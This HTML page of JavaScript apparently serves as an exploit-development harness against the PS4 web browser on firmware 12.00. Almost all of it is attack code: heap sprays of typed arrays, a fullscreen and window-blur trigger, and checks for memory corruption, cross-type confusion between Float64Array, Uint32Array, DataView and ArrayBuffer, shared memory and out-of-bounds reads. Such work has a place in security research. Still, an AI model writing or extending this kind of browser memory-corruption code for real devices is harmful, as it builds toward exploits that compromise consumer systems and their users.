<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Advanced Tests (Fixed Triggers)</title>
<style>
    body { background-color: #f0f0f0; font-family: monospace; padding: 20px; }
    button { padding: 10px; font-size: 14px; cursor: pointer; margin-bottom: 5px; width: 100%; text-align: left; }
    div { background: white; border: 1px solid #ccc; padding: 10px; margin-top: 5px; min-height: 50px; }
    h2 { border-bottom: 1px solid #999; }
</style>
</head>
<body>

<h1>PS4 12.00 - ADVANCED CONFUSION TESTS (FIXED)</h1>

<h2>STAGE 1: Create First Corrupted with Markers</h2>
<button onclick="stage1()">CREATE FIRST</button>
<div id="s1"></div>

<script>
var g_first = null;
var g_arrays = [];

function stage1() {
    const r = document.getElementById('s1');
    r.innerHTML = 'Creating arrays with markers...<br>';
    
    const P = 2.121995791e-314;
    g_arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        const a = new Float64Array(8);
        a[0] = i;
        a[1] = i + 10000;
        a[2] = i + 20000;
        g_arrays.push(a);
    }
    
    // GATILHO CORRIGIDO
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.focus(); // Força o foco na janela

    setTimeout(() => { // Delay para garantir que o fullscreen carregou
        window.onblur = function() {
            r.innerHTML += 'Triggered!<br>';
            window.onblur = null; // Remove o evento para não repetir

            const spray = [];
            for(let i = 0; i < 8000; i++) {
                const s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            const corrupted = g_arrays.filter(a => a[0] === P);
            
            if(corrupted.length > 0) {
                g_first = corrupted[0];
                
                // Write markers
                const view = new DataView(g_first.buffer);
                view.setUint32(0, 0xAAAAAAAA, true);
                view.setUint32(4, 0xBBBBBBBB, true);
                view.setBigUint64(8, 0xCCCCCCCCDDDDDDDDn, true);
                view.setBigUint64(16, 0xEEEEEEEEFFFFFFFFn, true);
                
                r.innerHTML += '<b>✓ First array corrupted and marked</b><br>';
                r.innerHTML += 'Markers: 0xAAAAAAAA, 0xBBBBBBBB...<br>';
            } else {
                r.innerHTML += 'Failed to corrupt. Try again.<br>';
            }
        };
    }, 1000); // 1 segundo de espera antes de ativar o gatilho
}
</script>

<hr>

<h2>TEST 1: Float64Array Inheritance</h2>
<button onclick="test1()">RUN TEST 1</button>
<div id="t1"></div>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 1: Float64Array -> Float64Array</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    // GATILHO CORRIGIDO
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 1 logic...<br>';

            // Lógica original do Teste 1
            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                const s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            const corrupted = g_arrays.filter(a => a[0] === P);
            
            if(corrupted.length > 1) {
                const g_second = corrupted[1];
                r.innerHTML += '<br><b>Got second array</b><br>';
                
                const view2 = new DataView(g_second.buffer);
                const m1 = view2.getUint32(0, true);
                const m2 = view2.getUint32(4, true);
                
                r.innerHTML += 'Offset 0: 0x' + m1.toString(16) + (m1 === 0xAAAAAAAA ? ' ✓ MATCH!' : '') + '<br>';
                r.innerHTML += 'Offset 4: 0x' + m2.toString(16) + (m2 === 0xBBBBBBBB ? ' ✓ MATCH!' : '') + '<br>';
                
                g_first[7] = 123.456;
                const check = g_second[7];
                r.innerHTML += 'Sanity Write: ' + check + '<br>';
                if(Math.abs(check - 123.456) < 0.001) r.innerHTML += '✓ SHARED MEMORY CONFIRMED<br>';
            } else {
                r.innerHTML += 'Second corruption not found.<br>';
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 2: Float64Array -> Uint32Array</h2>
<button onclick="test2()">RUN TEST 2</button>
<div id="t2"></div>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 2: Uint32Array Confusion</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    // GATILHO CORRIGIDO ADICIONADO AO TESTE 2
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 2 spray...<br>';

            // Lógica original do Teste 2
            const spray = [];
            for(let i = 0; i < 5000; i++) {
                const a = new Uint32Array(16);
                a.fill(0x42424242);
                spray.push(a);
            }
            r.innerHTML += 'Created 5000 Uint32Arrays<br>';
            
            const view1 = new DataView(g_first.buffer);
            let found = false;
            
            for(let i = 0; i < spray.length; i++) {
                const view2 = new DataView(spray[i].buffer);
                // Checa primeiros bytes para performance
                const val = view2.getUint32(0, true);
                    
                if(val === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ Uint32Array[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    spray[i][0] = 0x99999999;
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = g_first[0];
                    const check_u32 = new Uint32Array(buf)[0];
                    
                    r.innerHTML += 'g_first[0] as hex: 0x' + check_u32.toString(16) + '<br>';
                    if(check_u32 === 0x99999999) r.innerHTML += '<b>✓✓ CROSS-TYPE CONFUSION CONFIRMED!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No Uint32Array overlap detected<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 3: Float64Array -> DataView</h2>
<button onclick="test3()">RUN TEST 3</button>
<div id="t3"></div>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 3: DataView Accessor</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    // GATILHO CORRIGIDO ADICIONADO AO TESTE 3
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 3 spray...<br>';

            // Lógica original do Teste 3
            const spray = [];
            for(let i = 0; i < 1000; i++) {
                const buf = new ArrayBuffer(64);
                const dv = new DataView(buf);
                for(let j = 0; j < 64; j += 4) {
                    dv.setUint32(j, 0x55550000 + i, true);
                }
                spray.push(dv);
            }
            r.innerHTML += 'Created 1000 DataViews<br>';
            
            let found = false;
            for(let i = 0; i < spray.length; i++) {
                const dv = spray[i];
                const val = dv.getUint32(0, true);
                    
                if(val === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ DataView[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    dv.setUint32(0, 0x88888888, true);
                    const view1 = new DataView(g_first.buffer);
                    const check = view1.getUint32(0, true);
                    
                    r.innerHTML += 'Check g_first: 0x' + check.toString(16) + '<br>';
                    if(check === 0x88888888) r.innerHTML += '<b>✓✓ DATAVIEW CONFUSION CONFIRMED!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No DataView overlap<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 4: Float64Array -> ArrayBuffer</h2>
<button onclick="test4()">RUN TEST 4</button>
<div id="t4"></div>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 4: Direct ArrayBuffer</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    // GATILHO CORRIGIDO ADICIONADO AO TESTE 4
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 4 spray...<br>';

            // Lógica original do Teste 4
            const spray = [];
            for(let i = 0; i < 5000; i++) {
                const buf = new ArrayBuffer(64);
                const view = new Uint8Array(buf);
                view.fill(0x77);
                spray.push(buf);
            }
            r.innerHTML += 'Created 5000 ArrayBuffers<br>';
            
            let found = false;
            for(let i = 0; i < spray.length; i++) {
                const buf = spray[i];
                const view = new Uint32Array(buf);
                
                if(view[0] === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ ArrayBuffer[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    view[0] = 0x66666666;
                    const v1 = new DataView(g_first.buffer);
                    const check = v1.getUint32(0, true);
                    
                    r.innerHTML += 'Sanity check: 0x' + check.toString(16) + '<br>';
                    if(check === 0x66666666) r.innerHTML += '<b>✓✓ ARRAYBUFFER CONFUSION!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No ArrayBuffer overlap<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 5: Property Inheritance Test</h2>
<button onclick="test5()">RUN TEST 5</button>
<div id="t5"></div>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 5: Custom Property Inheritance</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    // Configura a propriedade antes do gatilho
    g_first.customMarker = {
        id: 'UNIQUE_MARKER_12345',
        value: 0xDEADBEEF
    };
    r.innerHTML += 'Added customMarker property<br>';

    // GATILHO CORRIGIDO
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 5 logic...<br>';

            // Lógica original do Teste 5
            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                spray.push(new Float64Array(10));
                spray[i].fill(P);
            }
            
            const corrupted = g_arrays.filter(a => a[0] === P);
            
            if(corrupted.length > 1) {
                const g_second = corrupted[corrupted.length - 1];
                r.innerHTML += '<br><b>Got second array</b><br>';
                
                if(g_second.customMarker) {
                    r.innerHTML += '<b>✓✓ PROPERTY INHERITED!</b><br>';
                    r.innerHTML += 'customMarker.value: 0x' + g_second.customMarker.value.toString(16) + '<br>';
                } else {
                    r.innerHTML += 'No property inheritance<br>';
                }
                
                g_first.customMarker.value = 0xCAFEBABE;
                if(g_second.customMarker && g_second.customMarker.value === 0xCAFEBABE) {
                    r.innerHTML += '<b>✓ Property is SHARED reference!</b><br>';
                }
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 6: OOB with Fresh Second Array</h2>
<button onclick="test6()">RUN TEST 6</button>
<div id="t6"></div>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 6: OOB on fresh second array</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    // GATILHO CORRIGIDO
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 6 logic...<br>';

            // Lógica original do Teste 6
            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                spray.push(new Float64Array(10));
                spray[i].fill(P);
            }
            
            const corrupted = g_arrays.filter(a => a[0] === P);
            
            if(corrupted.length > 1) {
                const g_second = corrupted[corrupted.length - 1];
                r.innerHTML += '<br><b>Testing OOB:</b><br>';
                
                for(let idx = 8; idx < 15; idx++) {
                    try {
                        const val = g_second[idx];
                        if(val !== undefined) {
                            const buf = new ArrayBuffer(8);
                            new Float64Array(buf)[0] = val;
                            const hex = new BigUint64Array(buf)[0].toString(16);
                            
                            r.innerHTML += 'g_second[' + idx + ']: 0x' + hex + '<br>';
                            if(hex !== '7ff8000000000000') r.innerHTML += '<b>✓ NON-NaN VALUE AT OOB!</b><br>';
                        }
                    } catch(e) {
                        r.innerHTML += 'Index ' + idx + ': ' + e.message + '<br>';
                    }
                }
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>SUMMARY</h2>
<button onclick="summary()">SHOW SUMMARY</button>
<div id="summary"></div>

<script>
function summary() {
    const r = document.getElementById('summary');
    r.innerHTML = '<h3>TEST SUMMARY</h3>';
    r.innerHTML += 'All tests now utilize the forced Fullscreen/Focus/Blur trigger.<br>';
    r.innerHTML += 'This ensures memory grooming happens at the exact moment of execution.<br>';
}
</script>

</body>
</html>
